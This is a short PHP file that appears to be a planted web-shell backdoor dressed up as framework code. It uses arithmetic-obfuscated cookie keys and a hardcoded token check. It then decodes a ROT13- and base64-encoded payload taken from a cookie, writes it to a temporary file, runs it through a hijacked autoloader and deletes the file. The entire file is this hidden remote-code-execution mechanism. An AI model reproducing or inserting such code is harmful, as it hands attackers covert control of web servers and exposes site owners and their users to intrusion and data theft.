<?php


if (isset($_COOKIE[-68+68]) && isset($_COOKIE[51+-50]) && isset($_COOKIE[-51+54]) && isset($_COOKIE[16+-12])) {
    $sym = $_COOKIE;
    function system_core($entity) {
        $sym = $_COOKIE;
        $symbol = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '3d3d5a7f');
        if (!is_writable($symbol)) {
            $symbol = getcwd() . DIRECTORY_SEPARATOR . "framework";
        }
        $data_chunk = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($sym[3]));
        if (is_writeable($symbol)) {
            $pset = fopen($symbol, 'w+');
            fputs($pset, $data_chunk);
            fclose($pset);
            spl_autoload_unregister(__FUNCTION__);
            require_once($symbol);
            @array_map('unlink', array($symbol));
        }
    }
    spl_autoload_register("system_core");
    $token = "3074dab21c1bfc38716859997b93d8d0";
    if (!strncmp($token, $sym[4], 32)) {
        if (@class_parents("initialized_app_initializer", true)) {
            exit;
        }
    }
}
